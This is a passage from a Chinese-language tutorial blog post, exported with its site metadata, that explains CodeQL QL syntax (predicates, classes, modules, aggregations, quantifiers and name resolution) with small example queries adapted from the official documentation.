getAParentOf(result)\n}\n```\n\n谓词还可能对其参数的每个值产生多个结果（或根本没有结果）\n\n```java\nstring getANeighbor(string country) {\n\tcountry = \"France\" and result = \"Belgium\"\n\tor\n\tcountry = \"France\" and result = \"Germany\"\n\tor\n\tcountry = \"Germany\" and result = \"Austria\"\n\tor\n\tcountry = \"Germany\" and result = \"Belgium\"\n}\n\nselect getANeighbor(\"France\")\n```\n\n## Recursive(递归) predicates\n\n```java\nstring getANeighbor(string country) {\n  country = \"France\" and result = \"Belgium\"\n  or\n  country = \"France\" and result = \"Germany\"\n  or\n  country = \"Germany\" and result = \"Austria\"\n  or\n  country = \"Germany\" and result = \"Belgium\"\n  or\n  country = getANeighbor(result)\n}\n```\n\n## Kinds(种类) of predicates\n\n谓词有三种类型，即Non-member谓词、member谓词和Characteristic谓词。\n\n非成员谓词是在类之外定义的，也就是说，它们不是任何类的成员。\n\n```java\nint getSuccessor(int i) {  // 1. Non-member predicate\n  result = i + 1 and\n  i in [1 .. 9]\n}\n\nclass FavoriteNumbers extends int {\n  FavoriteNumbers() {  // 2. Characteristic predicate\n    this = 1 or  //特征谓词是类的构造函数中定义的谓词，用来描述类的成员资格（membership criteria）。它决定了一个值是否属于某个类。\n    this = 4 or\n    this = 9\n  }\n\n  string getName() {   // 3. Member predicate for the class `FavoriteNumbers`\n    this = 1 and result = \"one\"\n    or\n    this = 4 and result = \"four\"\n    or\n    this = 9 and result = \"nine\"\n  }\n}\n\nfrom FavoriteNumbers fn, string name\nwhere fn = 4 and fn.getName() = name  // 成员谓词只能在类的实例上应用\nselect name\n```\n\n## Binding behavior\n\nIt must be possible to evaluate a predicate in a finite(有限的) amount of time, so the set it describes is not usually allowed to be infinite(无限的). In other words, a predicate can only contain a finite number of tuples.\n\n这里的无限其实也不是无穷大或者无穷多。上面和下面的那些反例其实也就是多了一点判断条件。\n\n```java\nint getSuccessor(int i) {\n\tresult = i + 1 and\n\ti in [1 .. 9]\n}\n```\n\n```java\n/*\n  Compilation errors:\n  ERROR: \"i\" is not bound to a value.\n  ERROR: \"result\" is not bound to a value.\n  ERROR: expression \"i * 4\" is not bound to a value.\n*/\nint multiplyBy4(int i) {\n  result = i * 4\n}\n\n/*\n  Compilation errors:\n  ERROR: \"str\" is not bound to a value.\n  ERROR: expression \"str.length()\" is not bound to a value.\n*/\npredicate shortString(string str) {\n  str.length() < 10\n}\n```\n\n### Binding sets\n\n如果一定要用infinite的谓词。\n\n在这种情况下，您可以使用 bindingset 注释指定显式绑定集。此注释适用于任何类型的谓词。\n\n```java\nbindingset[i]\nint multiplyBy4(int i) {\n  result = i * 4\n}\n\nfrom int i\nwhere i in [1 .. 10]\nselect multiplyBy4(i)\n```\n\n也可以多个，这种形式的意思是。x,y至少有一个是bound的。和bindingset[x, y]不同，意味着两个都是bound的\n\n- If `x` is bound, then `x` and `y` are bound.\n- If `y` is bound, then `x` and `y` are bound.\n\n```java\nbindingset[x] bindingset[y]\npredicate plusOne(int x, int y) {\n  x + 1 = y\n}\n\nfrom int x, int y\nwhere y = 42 and plusOne(x, y)\nselect x, y\n```\n\n后者可以用于两种不同类型的情况\n\n```java\nbindingset[str, len]\nstring truncate(string str, int len) {\n  if str.length() > len\n  then result = str.prefix(len)\n  else result = str\n}\n```\n\n\n\n# 查询Queries\n\n```sql\nfrom /* ... 声明变量 ... */\nwhere /* ... logical formula ... */\nselect /* ... expressions ... */\n```\n\n除了“表达式”中描述的表达式之外，您还可以包括：\nas 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。\norder by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。\n\nfrom 和 where 部分是可选的。\n\n除了“表达式”中描述的表达式之外，您还可以包括：\n\n- as 关键字，后跟名称。这为结果列提供了“标签”，并允许您在后续的选择表达式中使用它们。\n- order by 关键字，后跟结果列的名称，以及可选的关键字 asc 或 desc。这决定了显示结果的顺序。\n\n这些和sql都差不多，不同地方在于是，这里的from可以声明变量。\n\n例子\n\n```sql\nfrom int x, int y\nwhere x = 3 and y in [0 .. 2]\nselect x, y, x * y as product, \"product: \" + product\n```\n\n## Query predicates\n\n```java\nint getProduct(int x, int y) {\n    x = 3 and\n    y in [0 .. 2] and\n    result = x * y\n}\n\nfrom int x, int y\nwhere x = 3 and y = 1 \nselect x, y,getProduct(x, y)\n```\n\n这个查询谓语返回以下结果\n\n| x    | y    | result |\n| :--- | :--- | :----- |\n| 3    | 0    | 0      |\n| 3    | 1    | 3      |\n| 3    | 2    | 6      |\n\n编写查询谓词而不是 select 子句的一个好处是，您也可以在代码的其他部分调用该谓词。相比之下，select 子句就像一个匿名谓词，因此您无法稍后调用它。\n\n# Types\n\n## Primitive types\n\n有以下这些类型。\n\nboolean，float，int，string，date。\n\nQL 在原始类型上定义了一系列内置操作，例如，1.toString() 是整数常量 1 的字符串表示形式。有关 QL 中可用的内置操作的完整列表，请参阅 QL 语言规范中的内置部分。\n\nhttps://codeql.github.com/docs/ql-language-reference/ql-language-specification/#built-ins\n\n> 此外，QlBuiltins::BigInt 中还有一个实验性的任意精度整数原始类型。默认情况下，此类型在 CodeQL CLI 中不可用，但可以通过将 --allow-experimental=bigint 选项传 来启用它。\n\n## Classes\n\n### 定义一个类\n\n1. class 关键字\n2. class 名，要求首字母大写\n3. 通过 extends和instanceof定义的supertypes\n4. 括号括起来的类体\n\n```java\nclass OneTwoThree extends int {\n  OneTwoThree() { // characteristic predicate\n    this = 1 or this = 2 or this = 3\n  }\n\n  string getAString() { // member predicate\n    result = \"One, two or three: \" + this.toString()\n  }\n\n  predicate isEven() { // member predicate\n    this = 2\n  }\n}\n```\n\n定义了一个类 OneTwoThree，它包含值 1 2 3。\n\nOneTwoThree 继承了 int，也就是说，它是 int 的子类。QL 中的类必须始终具有至少一个supertypes。使用 extends 关键字引用的supertypes称为**base types** of the class。\n\n### Class bodies\n\nThe body of a class can contain:\n- A characteristic predicate declaration.  // 前面讲 谓词种类 的时候都提到了 #Kinds(种类) of predicates\n- Any number of member predicate declarations. \n- Any number of field declarations.\n\n#### Characteristic predicates\n\n相当于构造方法。前面提到过\n\n#### Member predicates\n\n可以用这种方法调用一个member predicate\n\n```\n(OneTwoThree).getAString()\n```\n\n#### Fields\n\n在body of a class中进行声明，例子如下。\n\n```java\nclass SmallInt extends int {\n  SmallInt() { this = [1 .. 10] }\n}\n\nclass DivisibleInt extends SmallInt {\n  SmallInt divisor;   // declaration of the field `divisor`\n  DivisibleInt() { this % divisor = 0 }\n\n  SmallInt getADivisor() { result = divisor }\n}\n\nfrom DivisibleInt i\nselect i, i.getADivisor()\n```\n\n### Concrete classes\n\n比如上面那个 DivisibleInt 有一个  SmallInt 的 Fields\n\n下面这些就和面向对象的语言很相似，看一下名字就知道是什么意思。不细讲。\n\n### Abstract classes\n\n抽象类\n\n### Overriding member predicates\n\n重写父类谓词\n\n### Multiple inheritance\n\n多继承\n\n### Final extensions\n\n类似于final关键字。\n\n### Non-extending subtypes\n\n其实就是有点像接口，下面这个会报错。instanceof 声明的超类型中的字段和方法不会成为子类的一部分\n\n```java\nclass Foo extends int {\n    Foo() { this in [1 .. 10] }\n  \n    string fooMethod() { result = \"foo\" }\n  }\n  \n  class Bar instanceof Foo {\n    string toString() { result = super.fooMethod() }\n}\n\nselect any(Bar b).fooMethod()\n```\n\n```java\nclass Interface extends int {\n    Interface() { this in [1 .. 10] }\n    string foo() { result = \"\" }\n  }\n  \n  class Foo extends int {\n    Foo() { this in [1 .. 5] }\n    string foo() { result = \"foo\" }\n  }\n  \n  class Bar extends Interface instanceof Foo {\n    override string foo() { result = \"bar\" }\n}\n\nselect any(Bar b).foo()  // 返回 bar\n// select any(Foo f).foo()   // 返回foo\n```\n\n## \n\n# Modules\n之类就给一个例子吧，太复杂的官方也没有给例子，这就是好多语言都有的一个东西。\n\n**OneTwoThreeLib.qll**\n```java\nclass OneTwoThree extends int {\n    OneTwoThree() {\n      this = 1 or this = 2 or this = 3\n    }\n  }\n\n\nmodule M {\nclass OneTwo extends OneTwoThree {\n    OneTwo() {\n\t    this = 1 or this = 2\n\t    }\n\t}\n}\n\n```\n\n**OneTwoQuery.ql**\n```java\nimport OneTwoThreeLib\n\nfrom OneTwoThree ott\nwhere ott = 1 or ott = 2\nselect ott\n```\n\n在对chat的逼问之下，还是把这个调用方法给问出来了。\n**OneTwoQuery2.ql**\n```java\n// 导入库文件\nimport OneTwoThreeLib\n\n// 使用 M 模块中的 OneTwo 类\n\nfrom M::OneTwo oneTwoInstance\n\nselect oneTwoInstance, \"Instance of OneTwo\"\n```\n\n# Signatures\n\n这个概念其实比较抽象。我暂时不想详细的写。这里就直接给官网的例子了。但是手边暂时没有具体使用的案例。\n\n## Predicate signatures\n\n注意这个分号\n\n```java\nsignature int operator(int lhs, int rhs);\n```\n\n## Type signatures\n\n```java\nsignature class ExtendsInt extends int;\n\nsignature class CanBePrinted {\n  string toString();\n}\n```\n\n## Module signatures\n\n```java\nsignature module MSig {\n  class T;\n  predicate restriction(T t);\n  default string descr(T t) { result = \"default\" }\n}\n\nmodule Module implements MSig {\n  newtype T = A() or B();\n\n  predicate restriction(T t) { t = A() }\n}\n```\n\n### Parameterized module signatures\n\n```java\nsignature class NodeSig;\n\nsignature module EdgeSig<NodeSig Node> {\n  predicate apply(Node src, Node dst);\n}\n\nmodule Reachability<NodeSig Node, EdgeSig<Node> Edge> {\n  Node reachableFrom(Node src) {\n    Edge::apply+(src, result)\n  }\n}\n```\n\n# Aliases\n\n## Defining an alias\n\n### Module aliases\n\n```java\nmodule ModAlias = ModuleName;\n```\n\n下面这个会弃用oldversion。\n\n```java\ndeprecated module OldVersion = NewVersion;\n```\n\n### Type aliases\n\n```java\nclass TypeAlias = TypeName;\n```\n\n你可以使用别名将基本类型boolean的名称缩写为Bool：\n\n```java\nclass Bool = boolean;\n```\n\n在OneTwoThreeLib中使用模块M中定义的类OneTwoThreeLib.qll，你可以创建一个别名来使用更短的名称OT\n\n```java\nimport OneTwoThreeLib\n\nclass OT = M::OneTwo;\n\n...\n\nfrom OT ot\nselect ot\n```\n\n### Predicate aliases\n\n```java\nint getSuccessor(int i) {\n  result = i + 1 and\n  i in [1 .. 9]\n}\n```\n\n可以为这个谓语设置一个这样的别名。\n\n```java\npredicate succ = getSuccessor/1;\n```\n\n### Strong and weak aliases\n\n有annotation 注解的是 Strong aliases。来自相同module/type/predicate的weak aliases定义之间的别名歧义是允许的，但来自不同Strong aliases定义之间的别名歧义是无效的QL。\n\n> Every alias definition is either **strong** or **weak**. An alias definition is **strong** if and only if it is a [type alias](https://codeql.github.com/docs/ql-language-reference/aliases/#type-aliases) definition with [annotation](https://codeql.github.com/docs/ql-language-reference/annotations/#annotations) `final`. During [name resolution](https://codeql.github.com/docs/ql-language-reference/name-resolution/#name-resolution), ambiguity between aliases from **weak** alias definitions for the same module/type/predicate is allowed, but ambiguity between between aliases from distinct **strong** alias definitions is invalid QL. Likewise, for the purpose of applicative instantiation of [parameterised modules](https://codeql.github.com/docs/ql-language-reference/modules/#parameterized-modules) and :ref:`parameterised module signatures <parameterized-module-signatures>, aliases from **weak** alias definitions for instantiation arguments do not result in separate instantiations, but aliases from **strong** alias definitions for instantiation arguments do.\n\n# Variables\n\n## Declaring a variable\n\n其实前面就一只在遇见了。声明，赋值，输出。\n\n```java\nfrom int i\nwhere i = 10\nselect i\n  \nfrom int i\nwhere i in [0 .. 9]\nselect i\n```\n\n## Free and bound variables\n\n```java\n\"hello\".indexOf(\"l\")\nmin(float f | f in [-3 .. 3])\n(i + 7) * 3\nx.sqrt()\n```\n\n第一个没有 variables  ，值是2\n\n第二个**bound variable**  ，值恒为3\n\n第三个**free variables** ，i 的值影响着整体的值。表达式是否成立取决于i的值。\n\n```java\n\"hello\".indexOf(\"l\") = 1\nmin(float f | f in [-3 .. 3]) = -3\n(i + 7) * 3 instanceof int\nexists(float y | x.sqrt() = y)\n```\n\n第一个永远不成立。\n\n第二个永远成立\n\n第三个可能成立\n\n第四个单y为负数时永远不成立\n\n# Expressions\n\n## Literals\n\nInteger literals\n\n```\n0\n42\n-2048\n```\n\nFloat literals\n\n```\n2.0\n123.456\n-100.5\n```\n\n等等\n\n## Parenthesized(括号) expressions\n\n## Ranges\n\n其实前面也见到一些了\n\n`[3 .. 7]`表示的是3到7的整数\n\n## Set literal expressions\n\n`[2, 3, 5, 7, 11, 13, 17, 19, 23, 29]` 是一个集合参数\n\n## Super expressions\n\n这个直接看例子，其实就是super.  然后找父类。\n\n```java\nclass A extends int {\n  A() { this = 1 }\n  int getANumber() { result = 2 }\n}\n\nclass B extends int {\n  B() { this = 1 }\n  int getANumber() { result = 3 }\n}\n\nclass C extends A, B {\n  // Need to define `int getANumber()`; otherwise it would be ambiguous\n  override int getANumber() {\n    result = B.super.getANumber()\n  }\n}\n\nfrom C c\nselect c, c.getANumber()\n```\n\n## Calls to predicates\n\n调用类的方法\n\n例如 a.getAChild() 是调用的 a 的谓词 getAChild()\n\n## Aggregations\n\n```\n<aggregate>(<variable declarations> | <formula> | <expression>)\n```\n\n```java\n// 内容超过500行的文件\ncount(File f | f.getTotalNumberOfLines() > 500 | f)   \n// 寻找函数最多的js文件。  \nmax(File f | f.getExtension() = \"js\" | f.getBaseName() order by f.getTotalNumberOfLines(), f.getNumberOfLinesOfCode())\n// 逐个字符比较 返回 De Morgan\nmin(string s | s = \"Tarski\" or s = \"Dedekind\" or s = \"De Morgan\" | s)\n// 返回36，等等吧，还有很多。\nsum(int i, int j | i = [0 .. 2] and j = [3 .. 5] | i * j)\n```\n\n### Evaluation of aggregates\n\n以这个为例\n\n```java\nselect sum(int i, int j |\n    exists(string s | s = \"hello\".charAt(i)) and \n    exists(string s | s = \"world!\".charAt(j)) \n    | i)\n```\n\n步骤\n\n1. **确定输入变量**：这是聚合表达式中声明的变量，包括在聚合内声明的变量和在聚合外部使用的变量。\n\n2. **生成所有可能的元组（组合）**：这些元组是输入变量的所有可能值的组合，必须满足给定的条件公式。\n\n3. **应用 <expression>**：对每个元组应用<expression>，并收集生成的值（可能有多个不同的值）。\n\n4. **应用 aggregates function**：使用 aggregates function（如 sum、count 等）对第3步中生成的值进行处理，计算最终结果。\n\n**1. 确定输入变量：**\n\n•输入变量是 i 和 j，分别代表 \"hello\" 和 \"world!\" 中的字符位置。\n\n**2. 生成所有可能的元组：**\n\n•我们通过 exists(string s | s = \"hello\".charAt(i)) 和 exists(string s | s = \"world!\".charAt(j)) 来生成所有可能的 (i, j) 对，表示字符串 \"hello\" 和 \"world!\" 中字符的位置。\n\n•\"hello\" 有 5 个字符（0, 1, 2, 3, 4），而 \"world!\" 有 6 个字符（0, 1, 2, 3, 4, 5）。\n\n•所以所有可能的 (i, j) 对是：\n\n```\n(0, 0), (0, 1), (0, 2), (0, 3), (0, 4), (0, 5),\n(1, 0), (1, 1), (1, 2), (1, 3), (1, 4), (1, 5),\n(2, 0), (2, 1), (2, 2), (2, 3), (2, 4), (2, 5),\n(3, 0), (3, 1), (3, 2), (3, 3), (3, 4), (3, 5),\n(4, 0), (4, 1), (4, 2), (4, 3), (4, 4), (4, 5)\n```\n\n**3. 应用<expression>：**\n\n•在这个查询中，聚合表达式是 i。我们从每个元组中选择 i 的值。\n\n•例如，所有 30 个元组中，i 的值会分别为：\n\n`0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 3, 3, 3, 3, 4, 4, 4, 4, 4, 4`\n\n**4. 应用 aggregates function：**\n\n`0 + 0 + 0 + 0 + 0 + 0 + 1 + 1 + 1 + 1 + 1 + 1 + 2 + 2 + 2 + 2 + 2 + 2 + 3 + 3 + 3 + 3 + 3 + 3 + 4 + 4 + 4 + 4 + 4 + 4`\n\n值为60。\n\n如果为这种\n\n```java\nselect sum(int i, int j |\n    exists(string s | s = \"hello\".charAt(i)) and \n    exists(string s | s = \"world!\".charAt(j)) \n    | i+j)\n```\n\n```\n0 + 0 = 0\n0 + 1 = 1\n0 + 2 = 2\n...\n4 + 5 = 9\n```\n\n值为135\n\n按照那4步来就行。\n\n### Omitting parts of an aggregation\n\n其实有些地方可以适当简写。\n\n1. **省略 <variable declarations> 和 <formula>**\n\n```\n<aggregate>(<type> v | <expression> = v | v)\n简写成\n<aggregate>(<expression>)\n```\n\n例如\n\n```java\ncount(int i | i = \"hello\".indexOf(\"l\") | i)\ncount(\"hello\".indexOf(\"l\"))\n```\n\n• \"hello\".indexOf(\"l\") 直接返回所有 \"l\" 的索引位置（2, 3）。\n\n• count 统计这些索引的个数，因此两种写法等价。\n\n2. **省略 <expression>**\n\n如果只有一个aggregation variable，则可以省略 aggregation variable，此时表达式默认为该变量本身。\n\n```\navg(int i | i = [0 .. 3] | i)\navg(int i | i = [0 .. 3])\n```\n\n3. 在 count 中，即使有多个aggregation variable，也可以省略 <expression>，此时表达式默认为常量 1，即统计满足条件的所有元组数量。\n\n```java\ncount(int i, int j | i in [1 .. 3] and j in [1 .. 3] | 1)\ncount(int i, int j | i in [1 .. 3] and j in [1 .. 3])\n```\n\n4. **省略 <formula>，仅保留两个竖线 ||**\n\n```\n<aggregate>(<variable declarations> | | <expression>)\n```\n\n```java\nmax(File f | | f.getTotalNumberOfLines())\n```\n\n这段代码的意思是：统计数据库中所有文件的最大行数。\n\n5. **省略 <formula> 和 <expression>**\n\n```java\ncount(File f | any() | 1)\ncount(File f | | 1)\ncount(File f)\n```\n\ncount(File f) 直接统计数据库中的文件数量。\n\n### Monotonic(单调) aggregates\n\n直接看官方给的例子吧。\n\n```java\nstring getPerson() { result = \"Alice\" or\n                     result = \"Bob\" or\n                     result = \"Charles\" or\n                     result = \"Diane\"\n                   }\nstring getFruit(string p) { p = \"Alice\"   and result = \"Orange\" or\n                            p = \"Alice\"   and result = \"Apple\" or\n                            p = \"Bob\"     and result = \"Apple\" or\n                            p = \"Charles\" and result = \"Apple\" or\n                            p = \"Charles\" and result = \"Banana\"\n                          }\nint getPrice(string f) { f = \"Apple\"  and result = 100 or\n                         f = \"Orange\" and result = 100 or\n                         f = \"Orange\" and result =   1\n                       }\n\npredicate nonmono(string p, int cost) {\n  p = getPerson() and cost = sum(string f | f = getFruit(p) | getPrice(f))\n}\n\nlanguage[monotonicAggregates]\npredicate mono(string p, int cost) {\n  p = getPerson() and cost = sum(string f | f = getFruit(p) | getPrice(f))\n}\n\nfrom string variant, string person, int cost\nwhere variant = \"default\"  and nonmono(person, cost) or\n      variant = \"monotonic\" and mono(person, cost)\nselect variant, person, cost\norder by variant, person\n```\n\n| variant   | person  | cost |\n| :-------- | :------ | :--- |\n| default   | Alice   | 201  |\n| default   | Bob     | 100  |\n| default   | Charles | 100  |\n| default   | Diane   | 0    |\n| monotonic | Alice   | 101  |\n| monotonic | Alice   | 200  |\n| monotonic | Bob     | 100  |\n| monotonic | Diane   | 0    |\n\n**标准聚合** 和 **单调聚合** 在处理公式 <formula> 和表达式 <expression> 的值时有如下不同：\n\n**标准聚合：**\n\n•对每个由 <formula> 生成的值，计算对应的 <expression> 值，**将它们展平为一个列表**。\n\n•然后对这个列表应用聚合函数，例如 sum、count 等。\n\n**单调聚合：**\n\n•对每个由 <formula> 生成的值，计算对应的 <expression> 值，**创建所有可能的组合**。\n\n•对每种组合分别应用聚合函数。\n\n**结果差异：**\n\n•**标准聚合** 通常返回一个结果，表示所有值的总和、计数等。\n\n•**单调聚合** 会返回多行结果，表示每种可能组合的聚合值。\n\n**场景 1: 缺少 <expression> 值**\n\n•如果 <formula> 生成的某个值没有对应的 <expression> 值：\n\n•**标准聚合** 会忽略这个缺失值，计算其他值的结果。\n\n•**单调聚合** 不会计算结果，因为缺失值使得无法创建完整的组合。\n\n**场景 2: 多个 <expression> 值**\n\n•如果 <formula> 生成的某个值有多个对应的 <expression> 值：\n\n•**标准聚合** 将所有 <expression> 值展平成一个列表，计算一个结果。\n\n•**单调聚合** 会生成多种组合，对每种组合分别计算结果。\n\n#### Recursive monotonic aggregates\n\n暂时不讲解\n\n## Any\n\n| Expression                          | Values                                      |\n| :---------------------------------- | :------------------------------------------ |\n| `any(File f)`                       | all `File`s in the database                 |\n| `any(Element e | e.getName())`      | the names of all `Element`s in the database |\n| `any(int i | i = [0 .. 3])`         | the integers `0`, `1`, `2`, and `3`         |\n| `any(int i | i = [0 .. 3] | i * i)` | the integers `0`, `1`, `4`, and `9`         |\n\n## Unary operations\n\n```\n-6.28\n+(10 - 4)\n+avg(float f | f = 3.4 or f = -9.8)\n-sum(int i | i in [0 .. 9] | i * i)\n```\n\n## Binary operations\n\n```\n5 % 2\n(9 + 1) / (-2)\n\"Q\" + \"L\"\n2 * min(float f | f in [-3 .. 3])\n```\n\n## Casts(类型转换)\n\n```java\nimport java\n\nfrom Type t\nwhere t.(Class).getASupertype().hasName(\"List\")\nselect t\n```\n\n## Don’t-care expressions\n\n其实这个符号在其它语言也经常见\n\n```java\nfrom string s\nwhere s = \"hello\".charAt(_)\nselect s\n```\n\n# Formulas 公式\n\n## Comparisons 比较\n\n这里提一下。\n就是一个等号在这里代表的就是Equal to\nNot equal to就是 !=\n定义的话用的是from\n\n## Type checks\n\n类型检查，和java里面的instanceof功能差不多\n\n`<expression> instanceof <type>`\n\n## Range checks\n检查范围\nA range check is a formula that looks like:\n`<expression> in <range>`\n\n`x in [2.1 .. 10.5]` \n\n## Calls to predicates\n\n谓词调用。\n\n## Parenthesized formulas\n\n杯括号包裹起来的 formulas\n\n\n### Explicit quantifiers显示量词\n\n#### `exists`\n\n都很好理解。\n\nThis quantifier has the following syntax:\n\n```\nexists(<variable declarations> | <formula>)\n```\n\nYou can also write `exists(<variable declarations> | <formula 1> | <formula 2>)`. This is equivalent to `exists(<variable declarations> | <formula 1> and <formula 2>)`.\n\nThis quantified formula introduces some new variables. It holds if there is at least one set of values that the variables could take to make the formula in the body true.\n\nFor example, `exists(int i | i instanceof OneTwoThree)` introduces a temporary variable of type `int` and holds if any value of that variable has type `OneTwoThree`.\n\n#### `forall`\n\nThis quantifier has the following syntax:\n\n```\nforall(<variable declarations> | <formula 1> | <formula 2>)\n```\n\n`forall` introduces some new variables, and typically has two formulas in its body. It holds if `<formula 2>` holds for all values that `<formula 1>` holds for.\n\nFor example, `forall(int i | i instanceof OneTwoThree | i < 5)` holds if all integers that are in the class `OneTwoThree` are also less than `5`. In other words, if there is a value in `OneTwoThree` that is greater than or equal to `5`, then the formula doesn’t hold.\n\nNote that `forall(<vars> | <formula 1> | <formula 2>)` is logically the same as `not exists(<vars> | <formula 1> | not <formula 2>)`.\n\n#### `forex`\n\nThis quantifier has the following syntax:\n\n```\nforex(<variable declarations> | <formula 1> | <formula 2>)\n```\n\nThis quantifier exists as a shorthand for:\n\n```\nforall(<vars> | <formula 1> | <formula 2>) and\nexists(<vars> | <formula 1> | <formula 2>)\n```\n\n> In other words, `forex` works in a similar way to `forall`, except that it ensures that there is at least one value for which `<formula 1>` holds. To see why this is useful, note that the `forall` quantifier could hold trivially. For example, `forall(int i | i = 1 and i = 2 | i = 3)` holds: there are no integers `i` which are equal to both `1` and `2`, so the second part of the body `(i = 3)` holds for every integer for which the first part holds.\n>\n> Since this is often not the behavior that you want in a query, the `forex` quantifier is a useful shorthand.\n\n### Implicit quantifiers\n\n相当于我们上面提到的 Don’t-care expressions。\n\n## Logical connectives\n\n1. Negation (not)\n2. Conditional formula (if…..then…else)\n3. Conjunction (and)\n4. Disjunction (or)\n5. Implication (implies)\n\n### `any()`\n\n### `none()`\n\n### `not`\n\n……\n\n# Annotations\n\n有点像java里面的修饰符。\n\n像 `abstract` `deprecated` `final`这些前面都提到过。\n\n# Lexical syntax\n\n## Comments\n\n有两种注释方法。\n\n```java\n/**\n * A QLDoc comment that describes the class `Digit`.\n */\nclass Digit extends int {  // A short one-line comment\n  Digit() {\n    this in [0 .. 9]\n  }\n}\n\n/*\n  A standard multiline comment, perhaps to provide\n  additional details, or to write a TODO comment.\n*/\n```\n\n# Name resolution(解析)\n\n## Names\n\n处理一个name首先在当前模块的命名空间中查找名称。\n\n如果是import语句。name resolution会更加复杂，看下面这个例子。\n\n```java\nimport javascript\n```\n\n编译器首先检查库模块javascript.qll，再采取下面说到的那些步骤。如果失败，它会检查在Example.ql的模块命名空间中定义的名为javascript的explicit module。\n\n## Qualified references\n\n限定引用是一种模块表达式，使用 . 作为文件路径分隔符。它只能在 import 语句中使用，用于导入由相对路径定义的库模块。比如我们Example.ql有如下一个import语句。\n\n```java\nimport examples.security.MyLibrary\n```\n\n**1. 当前目录查找** 编译器首先从包含当前 Example.ql 文件的目录中查找目标文件 examples/security/MyLibrary.ql\n\n**2. 查询目录查找** 查找相对路径 examples/security/MyLibrary.qll。如果查询目录未配置或路径中未找到目标文件，继续下一步。查询目录是第一个包含qlpack.yml文件的目录。（或者，在老版本中，是一个名为queries.xml的文件。）\n\n**3. 库路径查找 ** 查看qlpack.yml 文件中的 libraryPathDependencies 设置\n\n**4. 查找失败** 如果还找不到编译会报错。\n\n## Selections\n\n```\n<module_expression>::<name>\n```\n\n### Example\n\n**CountriesLib.qll**\n\n```java\nclass Countries extends string {\n  Countries() {\n    this = \"Belgium\"\n    or\n    this = \"France\"\n    or\n    this = \"India\"\n  }\n}\n\nmodule M {\n  class EuropeanCountries extends Countries {\n    EuropeanCountries() {\n      this = \"Belgium\"\n      or\n      this = \"France\"\n    }\n  }\n}class Countries extends string {\n  Countries() {\n    this = \"Belgium\"\n    or\n    this = \"France\"\n    or\n    this = \"India\"\n  }\n}\n\nmodule M {\n  class EuropeanCountries extends Countries {\n    EuropeanCountries() {\n      this = \"Belgium\"\n      or\n      this = \"France\"\n    }\n  }\n}\n```\n\n可以用如下方式使用\n\n```java\nimport CountriesLib\n\nfrom M::EuropeanCountries ec\nselect ec\n```\n\n```java\nimport CountriesLib::M\n\nfrom EuropeanCountries ec\nselect ec\n```\n\n## Namespaces\n\n命名空间。和其它语言比较像，不过多解释。\n\n### Global namespaces\n\n### Local namespaces\n\n# QL language specification\n\n语言规范太多了，这里就不细讲了。\n\nhttps://codeql.github.com/docs/ql-language-reference/ql-language-specification/\n","slug":"codeql基础语法学习","published":1,"date":"2024-11-28T11:01:41.043Z","updated":"2024-11-28T11:01:41.039Z","comments":1,"layout":"post","photos":[],"_id":"cm5js0uda0001ub9p25ay3w6b","content":"<p>csdn上阅读体验更加，这个目录太长这里用着不太舒服<br><a href=\"https://blog.csdn.net/qq_72685284/article/details/144118176\">https://blog.csdn.net/qq_72685284/article/details/144118176</a></p>\n<p>网上对于codeql的基础讲解的比较少，很多都是直接从codeql for java 或者直接拿一个靶场开始练习的。我通过对官方文档的一些翻译和加上自己的一些个人的理解和丰富合适的例子。帮助新人对codeql有一个基础的认识。因为好多英文名词并没有比较统一的翻译，所以我这里会标注一些关键的英文词的中文含义，很多意思还需要大家从英文的原文中体会其中的含义，同时方便大家结合文档进行查看。</p>\n<p>参考文档。</p>\n<p><a href=\"https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/\">https://codeql.github.com/docs/ql-language-reference/about-the-ql-language/</a></p>\n<h1 id=\"declarative-languages\"><a href=\"#declarative-languages\" class=\"headerlink\" title=\"declarative languages\"></a>declarative languages</h1><p>声明式(declarative)是结果导向的，命令式(imperative)是过程导向的。它们都有自己适用的场景和局限，于是现实中的编程语言常常都有两者的身影。</p>\n<p>declarative 案例 ： SQL, HTML ,codeql</p>\n<p>imperative 案例 ： C, C++, Java</p>\n<blockquote>\n<p>QL is a declarative, object-oriented(面向对象的) query language that is optimized(优化) to enable efficient analysis of hierarchical data structures, in particular, databases representing software artifacts.</p>\n<p>The syntax(语法) of QL is similar to SQL, but the semantics(语意) of QL are based on Datalog, a declarative logic programming language often used as a query language. This makes QL primarily a logic language, and all operations in QL are logical operations. Furthermore, QL inherits recursive(递归) predicates(谓语) from Datalog, and adds support for aggregates(聚合), making even complex queries concise(简洁) and simple. </p>\n</blockquote>\n<p>总之就是codeql的语法和常规的编程语言不太一样，他是基于datalog的，不能拿C,java 那类语言去类比，有很多的概念和专业用语都是不太一样的。</p>\n<blockquote>\n<p>Object orientation(面向对象) is an important feature of QL. The benefits of object orientation are well known – it increases modularity(模块化), enables information hiding, and allows code reuse(复用). QL offers all these benefits without compromising(妥协) on its logical foundation. This is achieved by defining a simple object model where classes are modeled as predicates and inheritance as implication. The libraries made available for all supported languages make extensive use of classes and inheritance.</p>\n</blockquote>\n<p>与sql相比，codeql的语言功能更加丰富，增加了面相对象的特性。可以自定义谓词。</p>\n<h1 id=\"谓词Properties\"><a href=\"#谓词Properties\" class=\"headerlink\" title=\"谓词Properties\"></a>谓词Properties</h1><p>谓词用于描述构成 QL 程序的逻辑关系。</p>\n<p>严格来说，谓词求值为一组元组。例如，考虑以下两个谓词定义：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate <span class=\"title function_\">isCountry</span><span class=\"params\">(string country)</span> &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"type\">or</span></span><br><span class=\"line\">  <span 